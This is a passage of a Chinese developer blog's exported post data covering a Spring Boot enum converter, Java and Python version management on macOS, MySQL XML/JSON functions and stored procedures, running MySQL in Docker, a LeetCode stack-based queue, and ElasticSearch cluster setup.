ConverterFactory\n\n首先有一个 BaseEnum\n\n```java\npublic interface BaseEnum {\n    String getValue();\n}\n```\n\n其他的枚举类实现这个借口就可以了，然后我们开始写 ConverterFactory\n\n\n```java\nimport org.springframework.core.convert.converter.Converter;\nimport org.springframework.core.convert.converter.ConverterFactory;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\n\npublic class StringToEnumConverterFactory implements ConverterFactory<String, BaseEnum> {\n\n    private static final Map<Class, Converter> converterMap =  new HashMap<>();\n\n    @Override\n    public <T extends BaseEnum> Converter<String, T> getConverter(Class<T> targetType) {\n        Converter<String, T> converter = converterMap.get(targetType);\n        if(converter == null) {\n            converter = new StringToEnumConverter<>(targetType);\n            converterMap.put(targetType, converter);\n        }\n        return converter;\n    }\n\n    class StringToEnumConverter<T extends BaseEnum> implements Converter<String, T> {\n\n        private Map<String, T> enumMap = new HashMap<>();\n\n        StringToEnumConverter(Class<T> enumType) {\n            T[] enums = enumType.getEnumConstants();\n            for(T e : enums) {\n                enumMap.put(e.getValue(), e);\n            }\n        }\n\n        @Override\n        public T convert(String source) {\n\n            T t = enumMap.get(source);\n            if (t == null) {\n                // 异常可以稍后去捕获\n                throw new IllegalArgumentException(\"No element matches \" + source);\n            }\n            return t;\n        }\n    }\n}\n```\n\n写完了之后还不行，还需要在 spring 中注册这个 ConverterFactory 为什么要注册呢，这个地方我还不会，以后来填坑\n\n```java\nimport org.springframework.boot.SpringBootConfiguration;\nimport org.springframework.format.FormatterRegistry;\nimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n@SpringBootConfiguration\npublic class WebMvcConfig implements WebMvcConfigurer {\n\n    /**\n     * 枚举类的转换器 addConverterFactory\n     */\n    @Override\n    public void addFormatters(FormatterRegistry registry) {\n        registry.addConverterFactory(new StringToEnumConverterFactory());\n    }\n}\n```\n\n这样以后我们就可以传参数 week month 等等了，如果传入了别的参数，就会抛出异常，异常的处理可以用全局的异常处理，这部分以后来填坑\n\n\n\n\n","categories":["SpringBoot"],"tags":["SpringBoot"]},{"title":"macOS Java 的版本管理","url":"/2018/11/2018-11-19-macOS-java-versions/","content":"\n上回书说道，[macOS Python 的版本管理](https://notes.0xl2oot.cn/macos/2018/11/19/macos-python-versions.html)，这次我来说一说 macOS Java 的版本管理。\n\nJava 的版本管理相对来说方便的多，一般我们只需要从官网上下载 Java JDK 的安装程序进行安装就可以很方便的管理了。\n\n<!-- more -->\n\n我们可以用 jenv 这个工具来管理\n\n```\nbrew install jenv\n```\n\n在 `~/.bash_profile` 文件中 添加下面两句(参考 [设置 macOS 的系统环境变量](https://notes.0xl2oot.cn/macos/2018/11/07/setting-up-environment-variables-in-macos-sierra.html))\n\n```\nexport PATH=\"$HOME/.jenv/bin:$PATH\"\neval \"$(jenv init -)\"\n```\n\n打开命令行\n\n```\nsource ~/.bash_profile\n```\n\n\n安装之后看\n\n```\n$ jenv --version\njenv 0.4.4\n```\n\n这样就安装好了\n\n我们看 Java 虚拟机下面这个目录，可以看到我们装了3个 JDK 分别是 1.8，10，11，如果有不需要的 JDK 我们可以直接删掉\n\n\n```\n/Library/Java/JavaVirtualMachines   \n$ ls\njdk-10.0.2.jdk   jdk-11.jdk       jdk1.8.0_181.jdk\n```\n\njenv 用法也很简单。 jenv add 加上 JDK 的 Home 目录就可以了\n\n\n```\n/Library/Java/JavaVirtualMachines/jdk-10.0.2.jdk/Contents/Home   \n$ jenv add `pwd`\noracle64-10.0.2 added\n10.0.2 added\n10.0 added\n/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home   \n$ jenv add `pwd`\noracle64-1.8.0.181 added\n1.8.0.181 added\n1.8 added\n```\n\n查看所有已安装的版本\n\n```\njenv versions\n```\n\n查看当前Java版本\n\n\n```\njenv version\n```\n\n设置全局 Java 版本\n\n```\njenv global 1.8.0.181\n```","categories":["macOS"],"tags":["Java","macOS"]},{"title":"macOS Python 的版本管理","url":"/2018/11/2018-11-19-macos-python-versions/","content":"\n用上 mac 后，发现装软件都变得简单了许多，要么是 App Store 中直接安装，要么是直接拖进 Application 文件夹。还可以用 brew 这样的工具装一些开发用的软件。\n\n但是问题也是有的，这样装了很多软件之后，自己也不知道装到哪了。\n\n<!-- more -->\n\n比如 Python，打开自己的 /usr/local/bin 之后发现一堆 Python 的软链接。还有 /System/Library/Frameworks/Python.framework/Versions 这个目录下面也有很多。可能还用了 pyenv 这个管理 Python 版本的工具。\n\n我们一个一个开始分析 \n\n```shell\n$ ls -l /usr/local/bin | grep python \nlrwxr-xr-x  1 WYH   admin        31 Nov 19 14:23 2to3 -> ../Cellar/python/3.7.1/bin/2to3\nlrwxr-xr-x  1 WYH   admin        38 Nov 19 14:22 2to3-2 -> ../Cellar/python@2/2.7.15_1/bin/2to3-2\nlrwxr-xr-x  1 WYH   admin        40 Nov 19 14:22 2to3-2.7 -> ../Cellar/python@2/2.7.15_1/bin/2to3-2.7\nlrwxr-xr-x  1 WYH   admin        35 Nov 19 14:23 2to3-3.7 -> ../Cellar/python/3.7.1/bin/2to3-3.7\nlrwxr-xr-x  1 WYH   admin        44 Nov 19 14:22 easy_install -> ../Cellar/python@2/2.7.15_1/bin/easy_install\nlrwxr-xr-x  1 WYH   admin        48 Nov 19 14:22 easy_install-2.7 -> ../Cellar/python@2/2.7.15_1/bin/easy_install-2.7\nlrwxr-xr-x  1 WYH   admin        43 Nov 19 14:23 easy_install-3.7 -> ../Cellar/python/3.7.1/bin/easy_install-3.7\nlrwxr-xr-x  1 WYH   admin        36 Nov 19 14:22 idle -> ../Cellar/python@2/2.7.15_1/bin/idle\nlrwxr-xr-x  1 WYH   admin        37 Nov 19 14:22 idle2 -> ../Cellar/python@2/2.7.15_1/bin/idle2\nlrwxr-xr-x  1 WYH   admin        39 Nov 19 14:22 idle2.7 -> ../Cellar/python@2/2.7.15_1/bin/idle2.7\nlrwxr-xr-x  1 WYH   admin        32 Nov 19 14:23 idle3 -> ../Cellar/python/3.7.1/bin/idle3\nlrwxr-xr-x  1 WYH   admin        34 Nov 19 14:23 idle3.7 -> ../Cellar/python/3.7.1/bin/idle3.7\nlrwxr-xr-x  1 WYH   admin        35 Nov 19 14:22 pip -> ../Cellar/python@2/2.7.15_1/bin/pip\nlrwxr-xr-x  1 WYH   admin        36 Nov 19 14:22 pip2 -> ../Cellar/python@2/2.7.15_1/bin/pip2\nlrwxr-xr-x  1 WYH   admin        38 Nov 19 14:22 pip2.7 -> ../Cellar/python@2/2.7.15_1/bin/pip2.7\nlrwxr-xr-x  1 WYH   admin        31 Nov 19 14:23 pip3 -> ../Cellar/python/3.7.1/bin/pip3\nlrwxr-xr-x  1 WYH   admin        33 Nov 19 14:23 pip3.7 -> ../Cellar/python/3.7.1/bin/pip3.7\nlrwxr-xr-x  1 WYH   admin        37 Nov 19 14:22 pydoc -> ../Cellar/python@2/2.7.15_1/bin/pydoc\nlrwxr-xr-x  1 WYH   admin        38 Nov 19 14:22 pydoc2 -> ../Cellar/python@2/2.7.15_1/bin/pydoc2\nlrwxr-xr-x  1 WYH   admin        40 Nov 19 14:22 pydoc2.7 -> ../Cellar/python@2/2.7.15_1/bin/pydoc2.7\nlrwxr-xr-x  1 WYH   admin        33 Nov 19 14:23 pydoc3 -> ../Cellar/python/3.7.1/bin/pydoc3\nlrwxr-xr-x  1 WYH   admin        35 Nov 19 14:23 pydoc3.7 -> ../Cellar/python/3.7.1/bin/pydoc3.7\nlrwxr-xr-x  1 WYH   admin        38 Nov 19 14:22 python -> ../Cellar/python@2/2.7.15_1/bin/python\nlrwxr-xr-x  1 WYH   admin        38 Nov 19 13:48 python-build -> ../Cellar/pyenv/1.2.8/bin/python-build\nlrwxr-xr-x  1 WYH   admin        45 Nov 19 14:22 python-config -> ../Cellar/python@2/2.7.15_1/bin/python-config\nlrwxr-xr-x  1 WYH   admin        39 Nov 19 14:22 python2 -> ../Cellar/python@2/2.7.15_1/bin/python2\nlrwxr-xr-x  1 WYH   admin        46 Nov 19 14:22 python2-config -> ../Cellar/python@2/2.7.15_1/bin/python2-config\nlrwxr-xr-x  1 WYH   admin        41 Nov 19 14:22 python2.7 -> ../Cellar/python@2/2.7.15_1/bin/python2.7\nlrwxr-xr-x  1 WYH   admin        48 Nov 19 14:22 python2.7-config -> ../Cellar/python@2/2.7.15_1/bin/python2.7-config\nlrwxr-xr-x  1 WYH   admin        34 Nov 19 14:23 python3 -> ../Cellar/python/3.7.1/bin/python3\nlrwxr-xr-x  1 WYH   admin        41 Nov 19 14:23 python3-config -> ../Cellar/python/3.7.1/bin/python3-config\nlrwxr-xr-x  1 WYH   admin        36 Nov 19 14:23 python3.7 -> ../Cellar/python/3.7.1/bin/python3.7\nlrwxr-xr-x  1 WYH   admin        43 Nov 19 14:23 python3.7-config -> ../Cellar/python/3.7.1/bin/python3.7-config\nlrwxr-xr-x  1 WYH   admin        37 Nov 19 14:23 python3.7m -> ../Cellar/python/3.7.1/bin/python3.7m\nlrwxr-xr-x  1 WYH   admin        44 Nov 19 14:23 python3.7m-config -> ../Cellar/python/3.7.1/bin/python3.7m-config\nlrwxr-xr-x  1 WYH   admin        39 Nov 19 14:22 pythonw -> ../Cellar/python@2/2.7.15_1/bin/pythonw\nlrwxr-xr-x  1 WYH   admin        40 Nov 19 14:22 pythonw2 -> ../Cellar/python@2/2.7.15_1/bin/pythonw2\nlrwxr-xr-x  1 WYH   admin        42 Nov 19 14:22 pythonw2.7 -> ../Cellar/python@2/2.7.15_1/bin/pythonw2.7\nlrwxr-xr-x  1 WYH   admin        33 Nov 19 14:23 pyvenv -> ../Cellar/python/3.7.1/bin/pyvenv\nlrwxr-xr-x  1 WYH   admin        37 Nov 19 14:23 pyvenv-3.7 -> ../Cellar/python/3.7.1/bin/pyvenv-3.7\nlrwxr-xr-x  1 WYH   admin        40 Nov 19 14:22 smtpd.py -> ../Cellar/python@2/2.7.15_1/bin/smtpd.py\nlrwxr-xr-x  1 WYH   admin        43 Nov 19 14:22 smtpd2.7.py -> ../Cellar/python@2/2.7.15_1/bin/smtpd2.7.py\nlrwxr-xr-x  1 WYH   admin        41 Nov 19 14:22 smtpd2.py -> ../Cellar/python@2/2.7.15_1/bin/smtpd2.py\nlrwxr-xr-x  1 WYH   admin        37 Nov 19 14:22 wheel -> ../Cellar/python@2/2.7.15_1/bin/wheel\nlrwxr-xr-x  1 WYH   admin        33 Nov 19 14:23 wheel3 -> ../Cellar/python/3.7.1/bin/wheel3\n```\n\n可以看到这里安装了 Python3 和 Python2，这里实际上我们不用管，这是 brew 可能在安装别的软件时候所需的依赖，这里如果需要升级的话，只需要\n\n```shell\nbrew upgrade python # 这里默认是 Python3 \nbrew upgrade python2\nbrew upgrade python3\n```\n\n使用 pyenv 这部分暂时不分析\n\n### 相关阅读\n\n- [macOS Java 的版本管理](https://notes.0xl2oot.cn/macos/2018/11/19/macOS-java-versions.html)\n- [设置 macOS 的系统环境变量](https://notes.0xl2oot.cn/macos/2018/11/07/setting-up-environment-variables-in-macos-sierra.html)","categories":["macOS"],"tags":["macOS","Python"]},{"title":"MySQL 的 xml 和 json 支持","url":"/2018/11/2018-11-20-mysql-xml-and-json/","content":"\nMySQL 的 xml 和 json 支持\n\n<!-- more -->\n\n```sql\n-- 测试 MySQL 5.6 MySQL 8.0 通过\ncreate table xml(\n\tid int not null auto_increment,\n\txml varchar(255) not null,\n\tprimary key(id)\n);\n\ninsert into xml(xml) values('<sucess>100</sucess>');\ninsert into xml(xml) values('<sucess>100</sucess><failure>200</failure>');\n\nselect id, extractvalue(xml, 'sucess') as sucess from xml;\n\n+----+--------+\n| id | sucess |\n+----+--------+\n|  1 | 100    |\n|  2 | 100    |\n+----+--------+\n1 row in set (0.00 sec)\n\nselect id, extractvalue(xml, 'sucess') as sucess, extractvalue(xml, 'failure') as failure from xml;\n+----+--------+---------+\n| id | sucess | failure |\n+----+--------+---------+\n|  1 | 100    |         |\n|  2 | 100    | 200     |\n+----+--------+---------+\n2 rows in set (0.00 sec)\n\n```\n\n\n\n```sql\n-- 测试 MySQL 8.0 通过\ncreate table json(\n\tid int not null auto_increment,\n\tjson varchar(255) not null,\n\tprimary key(id)\n);\n\n\ninsert into json(json) values('{\"name\": \"Alice\", \"sex\": \"female\", \"age\": 23}');\ninsert into json(json) values('{\"name\": \"Bob\", \"sex\": \"male\", \"age\": 20}');\n\nselect json_extract(json, '$.name') as name, json_extract(json, '$.sex') as sex, json_extract(json, '$.age') as age from json;\n+---------+----------+------+\n| name    | sex      | age  |\n+---------+----------+------+\n| \"Alice\" | \"female\" | 23   |\n| \"Bob\"   | \"male\"   | 20   |\n+---------+----------+------+\n2 rows in set (0.00 sec)\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","categories":["MySQL"],"tags":["Java","MySQL","Python","xml","json"]},{"title":"使用 docker 安装多版本的 MySQL","url":"/2018/11/2018-11-21-docker-mysql/","content":"\n首先从 docker 官网下载安装 docker。Windows 和 macOS 安装都是图形界面的比较方便\n\nLinux 的话，有的可能也比较简单，比如 Ubuntu\n\n<!-- more -->\n\n```\nsudo snap install docker\n```\n\n检查 docker 安装是否成功，出现类似下面的信息就是安装好了\n\n```shell\n$ docker version\nClient: Docker Engine - Community\n Version:           18.09.0\n API version:       1.39\n Go version:        go1.10.4\n Git commit:        4d60db4\n Built:             Wed Nov  7 00:47:43 2018\n OS/Arch:           darwin/amd64\n Experimental:      false\n\nServer: Docker Engine - Community\n Engine:\n  Version:          18.09.0\n  API version:      1.39 (minimum version 1.12)\n  Go version:       go1.10.4\n  Git commit:       4d60db4\n  Built:            Wed Nov  7 00:55:00 2018\n  OS/Arch:          linux/amd64\n  Experimental:     true\n\n```\n\n从 docker hub 上找到 MySQL 的镜像，查询得到 MySQL 的版本主要有 5.6 5.7 和 8.0。\n\n下面我们分别拉取镜像进行启动\n\n```shell\ndocker pull mysql:5.6\ndocker pull mysql:5.7\ndocker pull mysql:8.0\n```\n\nmysql 是官方的镜像，冒号后面跟的是版本号。为了方便，我们把三个 mysql 的容器分别叫做 mysql56, mysql57, mysql80\n\n```shell\ndocker run -p 3316:3306 --name mysql56 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6\ndocker run -p 3317:3306 --name mysql57 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7\ndocker run -p 3318:3306 --name mysql80 -e MYSQL_ROOT_PASSWORD=123456 -d mysql:8.0\n```\n\n> -p 3316:3306 是把容器的3306端口映射到本机的3316端口\n> --name 是给运行的容器一个别名\n> -e MYSQL_ROOT_PASSWORD=123456 是初始化 MySQL 的密码\n\n\n这样的话我们连接 MySQL 的命令就是下面的\n\n\n```shell\nmysql --port 3316 -uroot -h127.0.0.1 -p123456\nmysql --port 3317 -uroot -h127.0.0.1 -p123456\nmysql --port 3318 -uroot -h127.0.0.1 -p123456\n```\n\n但是这样可能不太行。\n\n因为直接从外面连 MySQL 可能是没有权限的\n\n我们先进入容器\n\n```shell\ndocker exec -it mysql80 bash\n```\n\n这样就相当于进入了容器中的 bash\n\n```shell\nmysql -uroot -p123456\n```\n\n进入 MySQL\n\n```sql\nupdate mysql.user set host=\"%\" where user=\"root\";\nflush privileges;\n```\n\n这样就可以了。\n\n一般情况下 MySQL5.6 和 MySQL5.7 应该是没问题了，但是 MySQL8.0 的密码验证方式变了，我们应该要改一下\n\n```sql\nupdate mysql.user set host=\"%\" where user=\"root\";\nALTER USER 'root'@'%' IDENTIFIED WITH mysql_native_password BY '123456';\nflush privileges;\n```\n\n这样就大功告成\n\n```shell\n$ mysql --port 3318 -uroot -h127.0.0.1 -p123456\nWarning: Using a password on the command line interface can be insecure.\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 49\nServer version: 8.0.13 MySQL Community Server - GPL\n\nCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql> select version();\n+-----------+\n| version() |\n+-----------+\n| 8.0.13    |\n+-----------+\n1 row in set (0.01 sec)\n```\n\n安装 phpmyadmin\n\n```\ndocker run --name myadmin56 -d --link mysql56:db -p 3600:80 phpmyadmin/phpmyadmin\n```\n\n访问 localhost:3600 即可\n\n\n最后我们看一下 docker 其他常用的命令\n\n| 命令 | 功能 |\n| -- | -- |\n| docker ps  | 查看正在运行的容器 |\n| docker ps -a | 查看所有的容器 |\n| docker stop mysql56 | 停止 mysql56 这个容器 |\n| docker start mysql56 | 启动 mysql56 这个容器 |\n| docker images | 查看 docker 所有镜像 |\n| docker image list | 同上 |\n| docker rm mysql56 | 删除 mysql56 这个容器 |\n| docker rmi mysql:5.6 | 删除 mysql 5.6 版本的 image | \n\n\n","categories":["docker"],"tags":["MySQL","docker"]},{"title":"LeetCode 232. 用栈实现队列","url":"/2018/11/2018-11-21-implement-queue-using-stacks/","content":"\n原题链接：\n\nhttps://leetcode.com/problems/implement-queue-using-stacks/description/\n\nhttps://leetcode-cn.com/problems/implement-queue-using-stacks/description/\n\n这道题其实比较简单，题目要求就是用栈实现一个队列。\n\n<!-- more -->\n\n我们考虑有两个栈，一个输入栈，一个输出栈。\n\n放数据永远放入输入栈，取数据永远从输出栈取。\n\n输出栈为空的时候把把输入栈的数据一次性取出来放到输出栈。\n\n下面是 Java 和 Python 的代码\n\nJava\n\n\n```java\nclass MyQueue {\n\n    private Stack<Integer> input = null;\n    private Stack<Integer> output = null;\n    \n    /** Initialize your data structure here. */\n    public MyQueue() {\n        \n        input = new Stack<>();\n        output = new Stack<>();\n        \n    }\n    \n    /** Push element x to the back of queue. */\n    public void push(int x) {\n        input.push(x);\n    }\n    \n    /** Removes the element from in front of queue and returns that element. */\n    public int pop() {\n        if(output.isEmpty()) {\n            while(!input.isEmpty()) {\n                output.push(input.pop());\n            }\n        }\n        return output.pop();\n    }\n    \n    /** Get the front element. */\n    public int peek() {\n        if(output.isEmpty()) {\n            while(!input.isEmpty()) {\n                output.push(input.pop());\n            }\n        }\n        return output.peek();\n    }\n    \n    /** Returns whether the queue is empty. */\n    public boolean empty() {\n        return input.isEmpty() && output.isEmpty();\n    }\n}\n```\n\nPython\n\n\n```python\nclass MyQueue:\n\n\tdef __init__(self):\n\t\t\"\"\"\n\t\tInitialize your data structure here.\n\t\t\"\"\"\n\t\tself.instack = []\n\t\tself.outstack = []\n\t\t\n\n\tdef push(self, x):\n\t\t\"\"\"\n\t\tPush element x to the back of queue.\n\t\t:type x: int\n\t\t:rtype: void\n\t\t\"\"\"\n\t\tself.instack.append(x)\n\t\t\n\n\tdef pop(self):\n\t\t\"\"\"\n\t\tRemoves the element from in front of queue and returns that element.\n\t\t:rtype: int\n\t\t\"\"\"\n\t\tif not self.outstack:\n\t\t\twhile self.instack:\n\t\t\t\tself.outstack.append(self.instack.pop())\n\t\treturn self.outstack.pop()\n\t\t\n\n\tdef peek(self):\n\t\t\"\"\"\n\t\tGet the front element.\n\t\t:rtype: int\n\t\t\"\"\"\n\t\tif not self.outstack:\n\t\t\twhile self.instack:\n\t\t\t\tself.outstack.append(self.instack.pop())\n\t\treturn self.outstack[-1]\n\t\t\n\n\tdef empty(self):\n\t\t\"\"\"\n\t\tReturns whether the queue is empty.\n\t\t:rtype: bool\n\t\t\"\"\"\n\t\treturn not self.outstack and not self.instack\n\n```","categories":["leetcode"],"tags":["leetcode","algorithm","queue","stack"]},{"title":"ElasticSearch 入门","url":"/2018/11/2018-11-22-get-started-with-elasticsearch/","content":"\n### 单实例安装\n\n安装 ElasticSearch，首先到官网下载 [https://www.elastic.co/downloads/elasticsearch](https://www.elastic.co/downloads/elasticsearch)\n\n<!-- more -->\n\n下载 tar.gz 文件，下载好之后解压\n\n```shell\ntar -xvf elasticsearch-x.x.x.tar.gz\n```\n\n进到解压好的目录里之后，就可以执行下面的命令运行了\n\n```shell\n./bin/elasticsearch\n```\n\n如果看到 started 字样，说明已经启动了\n\n再来确认一下是不是启动了\n\n```shell\n$ curl http://localhost:9200\n{\n  \"name\" : \"CW4wfvI\",\n  \"cluster_name\" : \"elasticsearch\",\n  \"cluster_uuid\" : \"jTCyqCjbQcq9DWekXXlfSg\",\n  \"version\" : {\n    \"number\" : \"6.5.1\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"tar\",\n    \"build_hash\" : \"8c58350\",\n    \"build_date\" : \"2018-11-16T02:22:42.182257Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"7.5.0\",\n    \"minimum_wire_compatibility_version\" : \"5.6.0\",\n    \"minimum_index_compatibility_version\" : \"5.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n```\n\n\n安装 ElasticSearch 的 web 前端管理界面 https://github.com/mobz/elasticsearch-head\n\n- `git clone git://github.com/mobz/elasticsearch-head.git`\n- `cd elasticsearch-head`\n- `npm install`\n- `npm run start`\n\n接下来，我们用浏览器打开 `http://localhost:9100`\n\n发现未连接 ElasticSearch，为什么呢？我们看到 elasticsearch-head 的文档中写了，想要用这个服务，必须在 ElasticSearch 的配置文件中开启 CORS\n\n所以，我们修改一下 config 目录中的 elasticsearch.yml 文件，在文件的末尾添加两行\n\n```yml\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"*\"\n```\n\n这样之后，我们重启 ElasticSearch，再次查看，集群健康值: green (0 of 0)，已经是正常的了。\n\n### 分布式安装\n\n拷贝三份，elasticsearch-master，elasticsearch-slave1，elasticsearch-slave2\n\nmaster 配置\n\n```yml\ncluster.name: 0xl2oot\nnode.name: master\nnode.master: true\n\nnetwork.host: 127.0.0.1\n```\n\n```shell\n$ curl http://localhost:9200\n{\n  \"name\" : \"master\",\n  \"cluster_name\" : \"0xl2oot\",\n  \"cluster_uuid\" : \"jTCyqCjbQcq9DWekXXlfSg\",\n  \"version\" : {\n    \"number\" : \"6.5.1\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"tar\",\n    \"build_hash\" : \"8c58350\",\n    \"build_date\" : \"2018-11-16T02:22:42.182257Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"7.5.0\",\n    \"minimum_wire_compatibility_version\" : \"5.6.0\",\n    \"minimum_index_compatibility_version\" : \"5.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n```\n\nslave1 配置\n\n```yml\ncluster.name: 0xl2oot\nnode.name: slave1\n\nnetwork.host: 127.0.0.1\nhttp.port: 9201\ndiscovery.zen.ping.unicast.hosts: [\"127.0.0.1\"]\n```\n\n```shell\ncurl http://localhost:9201\n{\n  \"name\" : \"slave1\",\n  \"cluster_name\" : \"0xl2oot\",\n  \"cluster_uuid\" : \"0fQo4KuxQhSh4g6HZmkwZA\",\n  \"version\" : {\n    \"number\" : \"6.5.1\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"tar\",\n    \"build_hash\" : \"8c58350\",\n    \"build_date\" : \"2018-11-16T02:22:42.182257Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"7.5.0\",\n    \"minimum_wire_compatibility_version\" : \"5.6.0\",\n    \"minimum_index_compatibility_version\" : \"5.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n```\n\nslave2 配置\n\n```yml\ncluster.name: 0xl2oot\nnode.name: slave2\n\nnetwork.host: 127.0.0.1\nhttp.port: 9202\ndiscovery.zen.ping.unicast.hosts: [\"127.0.0.1\"]\n```\n\n```shell\n$ curl http://localhost:9202\n{\n  \"name\" : \"slave2\",\n  \"cluster_name\" : \"0xl2oot\",\n  \"cluster_uuid\" : \"0fQo4KuxQhSh4g6HZmkwZA\",\n  \"version\" : {\n    \"number\" : \"6.5.1\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"tar\",\n    \"build_hash\" : \"8c58350\",\n    \"build_date\" : \"2018-11-16T02:22:42.182257Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"7.5.0\",\n    \"minimum_wire_compatibility_version\" : \"5.6.0\",\n    \"minimum_index_compatibility_version\" : \"5.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\n```\n\n打开 http://localhost:9100 查看\n\n![29-17-53-ScreenShot2018-11-22at12.10.42PM-8uCfEC](https://up-img.yonghong.tech/pic/2021/07/29-17-53-Screen%20Shot%202018-11-22%20at%2012.10.42%20PM-8uCfEC.png)\n\n\n### 在远程的机器上进行安装\n\n\n如果是在远程的服务器上或者是虚拟机上进行安装，如果有需要暴露出端口，那么需要修改 host 为 0.0.0.0 \n\n\n```\nnetwork.host: 0.0.0.0\n```\n\n并且添加下面的一行\n\n\n```\ntransport.host: localhost\n```\n\n最新版的 Ubuntu 18.10 还需要修改防火墙配置\n\n```\nsudo ufw allow 9200 # 需要什么就暴露什么端口\n```\n\n查看防火墙信息 \n\n```\nsudo ufw status\n```\n\n","categories":["ElasticSearch"],"tags":["ElasticSearch"]},{"title":"MySQL 高级用法","url":"/2018/11/2018-11-23-mysql-advanced/","content":"\n> 所有数据均来源于 [https://www.yiibai.com/mysql/stored-procedure.html](https://www.yiibai.com/mysql/stored-procedure.html)\n\n<!-- more -->\n\n### desc\n\n```sql\ndesc table_name;\n```\n\n查看表的结构，`desc` 是 `description` 的缩写\n\n### 存储过程\n\n```sql\nDELIMITER $$\n\nCREATE PROCEDURE get_order_by_cust(\n IN cust_no INT,\n OUT shipped INT,\n OUT canceled INT,\n OUT resolved INT,\n OUT disputed INT)\nBEGIN\n -- shipped\n SELECT\n            count(*) INTO shipped\n        FROM\n            orders\n        WHERE\n            customerNumber = cust_no\n                AND status = 'Shipped';\n\n -- canceled\n SELECT\n            count(*) INTO canceled\n        FROM\n            orders\n        WHERE\n            customerNumber = cust_no\n                AND status = 'Canceled';\n\n -- resolved\n SELECT\n            count(*) INTO resolved\n        FROM\n            orders\n        WHERE\n            customerNumber = cust_no\n                AND status = 'Resolved';\n\n -- disputed\n SELECT\n            count(*) INTO disputed\n        FROM\n            orders\n        WHERE\n            customerNumber = cust_no\n                AND status = 'Disputed';\n\nEND $$\nDELIMITER ;\n```\n\n```sql\nselect @shipped, @canceled, @resolved, @disputed;\n```\n\n```\n+----------+-----------+-----------+-----------+\n| @shipped | @canceled | @resolved | @disputed |\n+----------+-----------+-----------+-----------+\n|       22 |         0 |         1 |         1 |\n+----------+-----------+-----------+-----------+\n1 row in set (0.00 sec)\n```\n\n```sql\n-- 列出您有权访问的数据库的所有存储过程\nSHOW PROCEDURE STATUS;\n```\n\n\n```sql\n-- 在特定数据库中显示存储过程\nSHOW PROCEDURE STATUS WHERE db = 'yiibaidb';\n```\n\n\n```sql\n-- 显示具有特定模式的存储过程\nSHOW PROCEDURE STATUS WHERE name LIKE '%product%'\n```\n\n```sql\n-- 显示特定存储过程的源代码\nSHOW CREATE PROCEDURE stored_procedure_name\n```\n\n例如\n\n```sql\nSHOW CREATE PROCEDURE GetAllProducts\\G\n*************************** 1. row ***************************\n           Procedure: GetAllProducts\n            sql_mode: NO_AUTO_VALUE_ON_ZERO\n    Create Procedure: CREATE DEFINER=`root`@`%` PROCEDURE `GetAllProducts`()\nBEGIN\n   SELECT *  FROM products;\n   END\ncharacter_set_client: utf8\ncollation_connection: utf8_general_ci\n  Database Collation: utf8_general_ci\n1 row in set (0.00 sec)\n```\n\n### 存储函数\n\n与存储过程不同，您可以在SQL语句中使用存储的函数，也可以在表达式中使用。 这有助于提高程序代码的可读性和可维护性。\n\n```sql\nDELIMITER $$\n\nCREATE FUNCTION CustomerLevel(p_creditLimit double) RETURNS VARCHAR(10)\n    DETERMINISTIC\nBEGIN\n    DECLARE lvl varchar(10);\n\n    IF p_creditLimit > 50000 THEN\n SET lvl = 'PLATINUM';\n    ELSEIF (p_creditLimit <= 50000 AND p_creditLimit >= 10000) THEN\n        SET lvl = 'GOLD';\n    ELSEIF p_creditLimit < 10000 THEN\n        SET lvl = 'SILVER';\n    END IF;\n\n RETURN (lvl);\nEND $$\nDELIMITER ;\n\n\nSELECT \n    customerName, CustomerLevel(creditLimit)\nFROM\n    customers\nORDER BY customerName LIMIT 10;\n\n\n+------------------------------+----------------------------+\n| customerName                 | CustomerLevel(creditLimit) |\n+------------------------------+----------------------------+\n| Alpha Cognac                 | PLATINUM                   |\n| American Souvenirs Inc       | SILVER                     |\n| Amica Models & Co.           | PLATINUM                   |\n| ANG Resellers                | SILVER                     |\n| Anna's Decorations, Ltd      | PLATINUM                   |\n| Anton Designs, Ltd.          | SILVER                     |\n| Asian Shopping Network, Co   | SILVER                     |\n| Asian Treasures, Inc.        | SILVER                     |\n| Atelier graphique            | GOLD                       |\n| Australian Collectables, Ltd | PLATINUM                   |\n+------------------------------+----------------------------+\n10 rows in set (0.00 sec)\n\n```\n\n在存储过程中使用存储函数，提高可读性\n\n```sql\nDELIMITER $$\n\nCREATE PROCEDURE GetCustomerLevel(\n    IN  p_customerNumber INT(11),\n    OUT p_customerLevel  varchar(10)\n)\nBEGIN\n    DECLARE creditlim DOUBLE;\n\n    SELECT creditlimit INTO creditlim\n    FROM customers\n    WHERE customerNumber = p_customerNumber;\n\n    SELECT CUSTOMERLEVEL(creditlim) \n    INTO p_customerLevel;\nEND $$\nDELIMITER ;\n```\n","categories":["MySQL"],"tags":["MySQL"]},{"title":"vuetifyjs 和 Nuxt 配合使用时，样式在生产环境失效","url":"/2019/01/2019-01-16-vuetify-css-in-dev-and-product/","content":"\nvuetify 按钮有一些属性，[比如 info, warning, error 和 success 等](https://vuetifyjs.com/zh-Hans/components/buttons)，这些在 dev 模式下是正常显示的，如下图，到了生产环境却不显示了，这是什么原因呢？\n\n- npm run dev 正常\n- npm run generate 放到 